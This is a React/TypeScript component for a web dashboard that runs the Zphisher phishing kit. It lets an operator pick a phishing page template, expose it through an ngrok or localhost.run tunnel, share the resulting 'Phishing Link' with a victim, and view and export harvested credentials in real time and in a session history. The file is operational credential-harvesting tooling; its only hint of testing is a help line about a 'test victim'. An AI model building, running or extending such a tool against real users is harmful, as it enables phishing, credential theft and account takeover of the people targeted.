import React, { useState, useRef } from 'react';
import { io, Socket } from 'socket.io-client';

const TUNNELS = ['ngrok', 'localhost.run'];

interface SessionHistory {
  session_id: string;
  template: string;
  tunnel_type: string;
  public_url: string;
  status: string;
  credentials_count: number;
  start_time?: number;
  end_time?: number;
}

const ZphisherTool: React.FC = () => {
  const [template, setTemplate] = useState('');
  const [templates, setTemplates] = useState<string[]>([]);
  const [tunnel, setTunnel] = useState('ngrok');
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [status, setStatus] = useState<any>(null);
  const [output, setOutput] = useState<string[]>([]);
  const [credentials, setCredentials] = useState<string[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [templateLoading, setTemplateLoading] = useState(true);
  const [templateError, setTemplateError] = useState<string | null>(null);
  const [ngrokAvailable, setNgrokAvailable] = useState(true);
  const [sshAvailable, setSshAvailable] = useState(true);
  const [osType, setOsType] = useState<'windows' | 'linux' | null>(null);
  const [showHelp, setShowHelp] = useState(false);
  const [tab, setTab] = useState<'main' | 'history'>('main');
  const [history, setHistory] = useState<SessionHistory[]>([]);
  const [historyLoading, setHistoryLoading] = useState(false);
  const [selectedSession, setSelectedSession] = useState<any>(null);
  const [detailLoading, setDetailLoading] = useState(false);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  const diagIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const socketRef = useRef<Socket | null>(null);

  // Fetch templates
  const fetchTemplates = async () => {
    setTemplateLoading(true);
    setTemplateError(null);
    try {
      const res = await fetch('/api/zphisher/templates');
      const data = await res.json();
      if (data.templates && data.templates.length > 0) {
        setTemplates(data.templates);
        setTemplate(data.templates[0]);
      } else {
        setTemplateError('No templates found.');
      }
    } catch (e) {
      setTemplateError('Failed to fetch templates.');
    }
    setTemplateLoading(false);
  };

  // Fetch tunnel diagnostics
  const fetchDiagnostics = async () => {
    try {
      const res = await fetch('/api/zphisher/diagnostics');
      const data = await res.json();
      setNgrokAvailable(!!data.ngrok_available);
      setSshAvailable(!!data.ssh_available);
      setOsType(data.os);
      if (!data.ngrok_available && tunnel === 'ngrok') setTunnel('localhost.run');
      if (!data.ssh_available && tunnel === 'localhost.run') setTunnel('ngrok');
    } catch {
      setNgrokAvailable(false);
      setSshAvailable(false);
      setOsType(null);
    }
  };

  // Fetch session history
  const fetchHistory = async () => {
    setHistoryLoading(true);
    try {
      const res = await fetch('/api/zphisher/history');
      const data = await res.json();
      setHistory(data.sessions || []);
    } catch {}
    setHistoryLoading(false);
  };

  // Fetch session detail
  const fetchSessionDetail = async (session_id: string) => {
    setDetailLoading(true);
    try {
      const res = await fetch(`/api/zphisher/history/${session_id}`);
      const data = await res.json();
      setSelectedSession(data);
    } catch {}
    setDetailLoading(false);
  };

  // Analytics
  const totalSessions = history.length;
  const sessionsWithCreds = history.filter(s => s.credentials_count > 0).length;
  const mostUsedTemplate = (() => {
    const counts: Record<string, number> = {};
    history.forEach(s => { counts[s.template] = (counts[s.template] || 0) + 1; });
    return Object.entries(counts).sort((a, b) => b[1] - a[1])[0]?.[0] || '-';
  })();

  // On mount: fetch templates and diagnostics, and poll diagnostics every 10s
  React.useEffect(() => {
    fetchTemplates();
    fetchDiagnostics();
    diagIntervalRef.current = setInterval(fetchDiagnostics, 10000);
    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
      if (diagIntervalRef.current) clearInterval(diagIntervalRef.current);
      if (socketRef.current) socketRef.current.disconnect();
    };
  }, []);

  // Real-time output streaming
  React.useEffect(() => {
    if (!sessionId) return;
    // Connect to Socket.IO backend
    const socket = io('/', { transports: ['websocket'] });
    socketRef.current = socket;
    socket.emit('join', { session_id: sessionId });
    socket.on('zphisher_output', (data: any) => {
      if (data.session_id !== sessionId) return;
      setOutput(prev => [...prev, data.line]);
      if (data.credentials) setCredentials(prev => prev.includes(data.credentials) ? prev : [...prev, data.credentials]);
    });
    return () => {
      socket.disconnect();
    };
  }, [sessionId]);

  const startSession = async () => {
    setLoading(true);
    setError(null);
    setOutput([]);
    setCredentials([]);
    try {
      const res = await fetch('/api/zphisher/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ template, tunnel })
      });
      const data = await res.json();
      if (data.session_id) {
        setSessionId(data.session_id);
        pollStatus(data.session_id);
        intervalRef.current = setInterval(() => pollStatus(data.session_id), 2000);
      } else {
        setError(data.error || 'Failed to start session');
      }
    } catch (e) {
      setError('Failed to start session');
    }
    setLoading(false);
  };

  const pollStatus = async (id: string) => {
    const res = await fetch(`/api/zphisher/status?session_id=${id}`);
    const data = await res.json();
    setStatus(data);
  };

  const stopSession = async () => {
    if (!sessionId) return;
    setLoading(true);
    await fetch('/api/zphisher/stop', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_id: sessionId })
    });
    setSessionId(null);
    setStatus(null);
    setOutput([]);
    setCredentials([]);
    setLoading(false);
    if (intervalRef.current) clearInterval(intervalRef.current);
    if (socketRef.current) socketRef.current.disconnect();
  };

  return (
    <div className="max-w-2xl mx-auto py-8 px-4">
      <div className="flex gap-4 mb-6">
        <button
          className={`px-4 py-2 rounded ${tab === 'main' ? 'bg-blue-600 text-white' : 'bg-gray-200'}`}
          onClick={() => setTab('main')}
        >
          Main Tool
        </button>
        <button
          className={`px-4 py-2 rounded ${tab === 'history' ? 'bg-blue-600 text-white' : 'bg-gray-200'}`}
          onClick={() => { setTab('history'); fetchHistory(); }}
        >
          Session History
        </button>
      </div>
      {tab === 'main' && (
        <>
          <h1 className="text-2xl font-bold mb-6 flex items-center gap-2">
            Zphisher Social Engineering Tool
            <button
              className="ml-2 text-blue-600 underline text-sm"
              onClick={() => setShowHelp(h => !h)}
            >
              {showHelp ? 'Hide Help' : 'How to use?'}
            </button>
          </h1>
          {showHelp && (
            <div className="bg-blue-50 border-l-4 border-blue-400 p-4 mb-6 rounded text-blue-900 text-sm">
              <strong>How to use:</strong>
              <ol className="list-decimal ml-6 mt-2 space-y-1">
                <li>Select a phishing template and tunnel type. <span title="ngrok is more reliable if available." className="underline cursor-help">(?)</span></li>
                <li>Click <b>Start Session</b>. Wait for the phishing link to appear.</li>
                <li>Share the link with your test victim. Captured credentials will appear below.</li>
                <li>Click <b>Stop Session</b> to terminate Zphisher and the tunnel.</li>
              </ol>
              <div className="mt-2 text-xs text-gray-700">
                <b>Tip:</b> If ngrok or localhost.run is not available, check your system PATH or install them.<br />
                <b>Note:</b> On Windows, WSL is required for Zphisher and SSH tunneling.
              </div>
            </div>
          )}
          {error && <div className="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-4 rounded">{error}</div>}
          <div className="bg-white rounded shadow p-6 mb-6">
            <div className="mb-4 flex flex-col md:flex-row gap-4">
              <div className="flex-1">
                <label className="block font-semibold mb-1">Template
                  <span className="ml-1 text-xs text-gray-400" title="Choose the phishing page to use.">?</span>
                </label>
                {templateLoading ? (
                  <div className="text-gray-500">Loading templates...</div>
                ) : templateError ? (
                  <div className="text-red-600">{templateError}</div>
                ) : (
                  <div className="flex gap-2 items-center">
                    <select
                      className="w-full border rounded px-3 py-2"
                      value={template}
                      onChange={e => setTemplate(e.target.value)}
                      disabled={!!sessionId}
                    >
                      {templates.map(t => <option key={t} value={t}>{t}</option>)}
                    </select>
                    <button
                      className="px-2 py-1 bg-blue-100 text-blue-700 rounded hover:bg-blue-200 text-xs font-semibold"
                      onClick={fetchTemplates}
                      disabled={templateLoading || !!sessionId}
                      title="Refresh templates"
                    >
                      Refresh
                    </button>
                  </div>
                )}
              </div>
              <div className="flex-1">
                <label className="block font-semibold mb-1">Tunnel
                  <span className="ml-1 text-xs text-gray-400" title="ngrok is more reliable if available. localhost.run uses SSH.">?</span>
                </label>
                <select
                  className="w-full border rounded px-3 py-2"
                  value={tunnel}
                  onChange={e => setTunnel(e.target.value)}
                  disabled={!!sessionId || (!ngrokAvailable && tunnel === 'ngrok') || (!sshAvailable && tunnel === 'localhost.run')}
                >
                  {TUNNELS.map(t => (
                    <option key={t} value={t} disabled={
                      (t === 'ngrok' && !ngrokAvailable) ||
                      (t === 'localhost.run' && !sshAvailable)
                    }>
                      {t === 'ngrok' && !ngrokAvailable ? 'ngrok (not available)' :
                       t === 'localhost.run' && !sshAvailable ? 'localhost.run (not available)' : t}
                    </option>
                  ))}
                </select>
                <div className="text-xs text-gray-600 mt-1">
                  <span className={ngrokAvailable ? 'text-green-700' : 'text-red-600'}>ngrok: {ngrokAvailable ? 'Available' : 'Not available'}</span>
                  {' | '}
                  <span className={sshAvailable ? 'text-green-700' : 'text-red-600'}>localhost.run: {sshAvailable ? 'Available' : 'Not available'}</span>
                  {' | '}
                  <span className="text-blue-700">OS: {osType || '...'}</span>
                </div>
              </div>
            </div>
            <div className="flex gap-4">
              <button
                className="px-6 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 transition disabled:opacity-50"
                onClick={startSession}
                disabled={!!sessionId || loading || templateLoading || !!templateError}
              >
                Start Session
              </button>
              <button
                className="px-6 py-2 bg-red-500 text-white rounded hover:bg-red-600 transition disabled:opacity-50"
                onClick={stopSession}
                disabled={!sessionId || loading}
              >
                Stop Session
              </button>
            </div>
          </div>
          {status && (
            <div className="bg-gray-50 rounded shadow p-6 mb-6">
              <h2 className="text-lg font-semibold mb-2">Session Status: <span className="font-mono text-blue-700">{status.status}</span></h2>
              {status.public_url && (
                <div className="mb-2">
                  <span className="font-semibold">Phishing Link:</span>
                  <a href={status.public_url} target="_blank" rel="noopener noreferrer" className="ml-2 text-blue-600 underline break-all">{status.public_url}</a>
                </div>
              )}
              <div className="mb-2">
                <span className="font-semibold">Template:</span> {status.template}
              </div>
              <div className="mb-2">
                <span className="font-semibold">Tunnel:</span> {status.tunnel_type}
              </div>
              <div className="mb-2">
                <span className="font-semibold">Captured Credentials:</span>
                <ul className="list-disc ml-6 mt-1">
                  {credentials.length > 0 ? (
                    credentials.map((cred: string, i: number) => <li key={i} className="font-mono text-green-700">{cred}</li>)
                  ) : <li className="text-gray-500">None yet</li>}
                </ul>
              </div>
              <div className="mb-2">
                <span className="font-semibold">Live Output:</span>
                <pre className="bg-black text-green-400 rounded p-2 mt-1 max-h-48 overflow-y-auto text-xs">
                  {output.length > 0 ? output.slice(-30).join('\n') : 'No output yet.'}
                </pre>
              </div>
            </div>
          )}
        </>
      )}
      {tab === 'history' && (
        <div>
          <h2 className="text-xl font-bold mb-4">Session History</h2>
          <div className="mb-4 flex gap-8 text-sm">
            <div><b>Total Sessions:</b> {totalSessions}</div>
            <div><b>Sessions with Credentials:</b> {sessionsWithCreds}</div>
            <div><b>Most Used Template:</b> {mostUsedTemplate}</div>
          </div>
          {historyLoading ? (
            <div>Loading history...</div>
          ) : (
            <table className="w-full text-sm mb-6">
              <thead>
                <tr className="bg-gray-100">
                  <th className="p-2">Template</th>
                  <th className="p-2">Tunnel</th>
                  <th className="p-2">Status</th>
                  <th className="p-2">Credentials</th>
                  <th className="p-2">Started</th>
                  <th className="p-2">Actions</th>
                </tr>
              </thead>
              <tbody>
                {history.map(s => (
                  <tr key={s.session_id} className="border-b">
                    <td className="p-2">{s.template}</td>
                    <td className="p-2">{s.tunnel_type}</td>
                    <td className="p-2">{s.status}</td>
                    <td className="p-2 text-center">{s.credentials_count}</td>
                    <td className="p-2">{s.start_time ? new Date(s.start_time * 1000).toLocaleString() : '-'}</td>
                    <td className="p-2 flex gap-2">
                      <button className="px-2 py-1 bg-blue-100 text-blue-700 rounded text-xs" onClick={() => fetchSessionDetail(s.session_id)}>View</button>
                      <a
                        href={`/api/zphisher/export/${s.session_id}`}
                        className="px-2 py-1 bg-green-100 text-green-700 rounded text-xs"
                        download={`zphisher_session_${s.session_id}.log`}
                      >Export</a>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
          {selectedSession && (
            <div className="bg-white rounded shadow p-4 mb-6">
              <h3 className="font-semibold mb-2">Session Detail</h3>
              <div className="mb-2"><b>Template:</b> {selectedSession.template}</div>
              <div className="mb-2"><b>Tunnel:</b> {selectedSession.tunnel_type}</div>
              <div className="mb-2"><b>Status:</b> {selectedSession.status}</div>
              <div className="mb-2"><b>Phishing Link:</b> {selectedSession.public_url}</div>
              <div className="mb-2"><b>Started:</b> {selectedSession.start_time ? new Date(selectedSession.start_time * 1000).toLocaleString() : '-'}</div>
              <div className="mb-2"><b>Ended:</b> {selectedSession.end_time ? new Date(selectedSession.end_time * 1000).toLocaleString() : '-'}</div>
              <div className="mb-2"><b>Credentials:</b>
                <ul className="list-disc ml-6 mt-1">
                  {selectedSession.credentials && selectedSession.credentials.length > 0 ? (
                    selectedSession.credentials.map((cred: string, i: number) => <li key={i} className="font-mono text-green-700">{cred}</li>)
                  ) : <li className="text-gray-500">None yet</li>}
                </ul>
              </div>
              <div className="mb-2"><b>Output:</b>
                <pre className="bg-black text-green-400 rounded p-2 mt-1 max-h-48 overflow-y-auto text-xs">
                  {selectedSession.output && selectedSession.output.length > 0 ? selectedSession.output.slice(-30).join('\n') : 'No output yet.'}
                </pre>
              </div>
              <button className="px-3 py-1 bg-gray-200 rounded text-xs" onClick={() => setSelectedSession(null)}>Close</button>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default ZphisherTool; 